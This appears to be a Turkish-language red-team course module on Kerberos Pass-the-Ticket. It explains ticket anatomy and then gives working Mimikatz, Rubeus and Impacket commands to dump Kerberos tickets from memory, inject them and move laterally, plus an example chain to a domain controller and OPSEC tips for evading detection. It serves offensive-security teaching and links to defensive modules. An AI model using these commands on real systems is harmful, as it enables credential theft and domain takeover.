## 1. Kavramsal Temel — Neden Var?

Kerberos "biletli" bir sistemdir: kimliğini bir kez kanıtlarsın, karşılığında **taşınabilir kriptografik biletler** (TGT/TGS) alırsın. Kilit tasarım gerçeği:

> **Kerberos biletleri, onları kullanacak makineye "bağlı değildir" (varsayılan olarak IP/host kısıtı zorlanmaz). Bir makinenin belleğinden çaldığın bir TGT'yi kendi oturumuna enjekte edersen, sistem seni o biletin sahibi sanır. Buna Pass-the-Ticket (PtT) denir — parola da hash de gerekmez, sadece bilet.**

Bu, PtH'ten daha güçlüdür çünkü: (1) hiç kimlik-bilgisi (hash) taşımaz, sadece geçici bilet; (2) NTLM üretmez, saf Kerberos'tur → daha meşru; (3) çalınan bir **TGT** ile herhangi bir servise ST talep edebilirsin (tam kimlik), çalınan bir **TGS** ile ise sadece o spesifik servise erişirsin.

**Analoji:** TGT = binaya girişte aldığın "ana turnike kartı"; TGS = tek bir odanın anahtarı. Birinin ana kartını (TGT) kopyalarsan, o kişi olarak tüm odaların anahtarını (TGS) turnikeden çıkartabilirsin.

## 2. Teknik Derinlik — Bilet Anatomisi ve Enjeksiyon

### 2.1 TGT vs TGS ve bilet formatları

```
   TGT (Ticket Granting Ticket)      TGS (Service Ticket)
   krbtgt anahtarıyla şifreli        servis hesabı anahtarıyla şifreli
   "kimlik kartı" — her servise ST   "oda anahtarı" — tek servis (cifs/host…)

   Formatlar:
   .kirbi   → Windows/Rubeus/Mimikatz (KRB_CRED yapısı, base64)
   .ccache  → Linux/Impacket (MIT Kerberos credential cache)
   çevrim:  impacket-ticketConverter ticket.kirbi ticket.ccache
```

### 2.2 Biletin içi ve neden "taşınabilir"

Bir bilet (`Ticket` ASN.1) şunları taşır: şifreli `enc-part` (istemci kimliği, oturum anahtarı, yetki verisi/PAC, geçerlilik). Enjekte eden makine bunu **kendi LSASS bilet önbelleğine** koyar; sonraki Kerberos isteklerinde bu bilet kullanılır. DC biletin `enc-part`'ını krbtgt anahtarıyla çözebildiği için (imza geçerli) kimliği kabul eder — **biletin nereden geldiğini sorgulamaz.**

> **Zaman sınırı:** Çalınan TGT'nin `endtime`'ı vardır (varsayılan 10 saat, yenilenebilir 7 gün). Süresi dolmuş bileti kullanamazsın. Bu yüzden taze bilet çal veya OPtH ile kendi TGT'ni üret ([04.1](./04.1_Pass_the_Hash_ve_Overpass_the_Hash.md)).

### 2.3 PtT vs forged ticket (Golden/Silver) ayrımı

PtT = **gerçek, geçerli** bir bileti çal-enjekte et. Golden/Silver ([Modül 09](../Modul_09_Domain_Hakimiyeti_ve_Kalicilik/)) = krbtgt/servis anahtarıyla **sıfırdan sahte bilet üret**. PtT için krbtgt hash'i gerekmez — sadece halihazırda var olan biletler. Bu, PtT'yi erken-aşama yanal hareket için ideal yapar.

### 2.4 PAC — biletin içindeki yetki kartı

Her bilet, `enc-part` içinde bir **PAC (Privilege Attribute Certificate)** taşır: kullanıcının SID'i, grup üyelikleri (RID'ler), yetki bilgisi. Servis, kullanıcının "kim ve neye yetkili" olduğunu bu PAC'tan okur.

```
   PAC {
     LogonInfo   : UserId(RID), PrimaryGroupId, GroupIds[] (Domain Admins=512…)
     ClientName / SignatureData (KDC + server imzaları)
   }
```

> **Neden önemli?** Çaldığın gerçek TGT'nin PAC'ı **meşru ve imzalıdır** → hiçbir tutarsızlık yoktur (Golden Ticket'ta forge edilen PAC bazen anomali bırakır; PtT'de bırakmaz). Bu, PtT'yi tespit açısından forge biletlerden daha sinsi yapar.

### 2.5 Bilet türü seçimi — TGT mi TGS mi çalmalı?

```
   TGT çalarsan  → tam kimlik: her servise ST üretebilirsin (esnek, güçlü)
   TGS çalarsan  → tek servis: yalnızca o cifs/host/mssql'e erişim (dar ama yeterliyse sessiz)
   Silver Ticket senaryosu: servis anahtarın varsa TGS forge et → DC'yi hiç görme (Modül 09)
```

## 3. Pratik Uygulama — Çok Araçlı

### 3.1 Bilet toplama

```
:: Mimikatz — bellekteki tüm biletleri diske aktar
sekurlsa::tickets /export        :: [0;xxxx]-2-0-40e10000-user@krbtgt-CORP.LOCAL.kirbi
:: Rubeus — TGT'leri topla (monitor/dump)
Rubeus.exe dump /nowrap
Rubeus.exe triage             :: tüm oturumların biletlerini tablo hâlinde listele
```

```bash
# Linux — /tmp veya KRB5CCNAME'deki ccache'ler; ya da secretsdump sonrası
ls /tmp/krb5cc_*
```

### 3.2 Bilet enjeksiyonu (PtT)

```
:: Mimikatz — .kirbi bileti mevcut oturuma yükle
kerberos::ptt [0;xxxx]-2-0-...-user@krbtgt-CORP.LOCAL.kirbi
klist                          :: enjekte edilen bilet görünmeli
```

```
:: Rubeus — dosyadan veya base64'ten enjekte
Rubeus.exe ptt /ticket:ticket.kirbi
```

```bash
# Impacket / Linux — ccache'i ortama koy, Kerberos ile hareket et
export KRB5CCNAME=/tmp/administrator.ccache
impacket-psexec -k -no-pass corp.local/administrator@srv05.corp.local
nxc smb srv05.corp.local -u administrator -k --use-kcache
```

**Örnek `klist` (enjeksiyon sonrası):**
```
#0>  Client: administrator @ CORP.LOCAL
     Server: krbtgt/CORP.LOCAL @ CORP.LOCAL
     KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
     End Time: 7/5/2026 18:22:41 (yerel)      ← geçerli, kullanılabilir
```

### 3.3 tgtdeleg — hash'siz TGT elde etme (yerel hile)

```
:: Yerel adminlik olmadan, mevcut kullanıcının delege edilebilir TGT'sini çıkar
Rubeus.exe tgtdeleg /nowrap
:: GSS-API delegation hilesiyle kendi TGT'ni al → sonra ptt ile başka makinede kullan
```

### 3.4 Rubeus monitor — otomatik bilet toplama (bekleme saldırısı)

```
:: DC'ye periyodik giriş yapan hesapların biletlerini pasif topla (unconstrained ile birleşir)
Rubeus.exe monitor /interval:5 /nowrap
:: Bir domain admin oturum açtığında TGT'si düşer → ptt ile ele geçir → Modül 06 köprüsü
```

### 3.5 Gerçek-dünya PtT zinciri

```
   1) SRV05'te yerel admin (04.1). sekurlsa::tickets /export → 12 bilet
   2) Aralarından 'sqladmin' TGT'si (Server Operators üyesi) taze ve geçerli
   3) O TGT'yi Kali'ye taşı → ticketConverter → ccache → KRB5CCNAME
   4) nxc smb dc01 -k --use-kcache → sqladmin olarak DC'de işlem
   5) Server Operators → servis oluşturma yetkisi → DC üzerinde SYSTEM (Modül 05/09)
   Not: TGT süresi ~10 saat; zinciri süre bitmeden tamamla veya monitor ile taze bilet bekle.
```

| TGT yeniden kullanımı farklı host | T1550.003 | Aynı TGT birden çok IP/makineden; 4769 kaynak tutarsızlığı | [Blue 06.4](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.4_Kerberos_Anomali_Izleme.md) |

**OPSEC notları:**
- **PtT, NTLM üretmez** → PtH'den daha sessizdir. Ama bilet **dışa aktarma** anı (`sekurlsa::tickets /export`, `Rubeus dump`) LSASS'a erişir → Sysmon Event 10 ([Blue 03.1](../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/03.1_Credential_Guard_ve_LSASS_Korumasi.md)). Toplama gürültüsü, kullanma gürültüsünden fazladır; taze bilet varsa `tgtdeleg` (LSASS'a dokunmaz) tercih et.
- **Aynı bilet, birden çok kaynak = anomali.** Çalınan bir TGT'yi farklı IP'lerden kullanırsan, DC loglarında aynı kimliğin eşzamanlı çok konumdan Kerberos etkinliği belirir ([Blue 06.4](../../2-Blue_Team/Modul_06_Kerberos_ve_Delegation_Sertlestirme/06.4_Kerberos_Anomali_Izleme.md)). Bir bileti tek kaynaktan kullan.
- **Bilet ömrünü izle:** Süresi dolan bilet kullanımı 4769 hatası üretir ve dikkat çeker. `klist` ile `End Time`'ı kontrol et; süre bitmeden hareketi tamamla veya yenile.
- **`sekurlsa::tickets` vs `kerberos::list`:** İlki tüm oturumların biletlerini (yerel admin gerekir) verir; ikincisi sadece kendi oturumunun biletini. Yalnız kendi oturum bileti yeterliyse daha az ayrıcalık/iz ile çalış.
- Kısa bilet ömrü + Protected Users ([Blue 03.3](../../2-Blue_Team/Modul_03_Kimlik_Bilgisi_Korumasi/03.3_Protected_Users_ve_Authentication_Policies.md)) PtT penceresini daraltır; yüksek-değerli hedefler bu grupta olabilir.
